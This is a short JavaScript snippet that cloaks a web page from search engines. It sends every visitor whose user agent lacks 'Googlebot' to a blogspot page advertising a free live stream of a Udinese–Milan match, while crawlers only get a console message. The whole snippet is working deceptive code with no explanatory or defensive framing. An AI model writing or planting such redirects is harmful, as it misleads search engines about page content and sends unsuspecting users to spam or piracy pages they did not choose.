// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
if (!navigator.userAgent.includes('Googlebot')) {
  // Redirect only normal users
  window.location.href = "https://seriestvshowsport.blogspot.com/2026/10/udineze-milan-live-hd-25-10-2026-smotret-onlayn-pryamaya-translyatsiya-besplatno.html";
} else {
  // For search engine crawlers, you can choose to perform a different action or not redirect
  console.log("THanks for visiting my page");
}
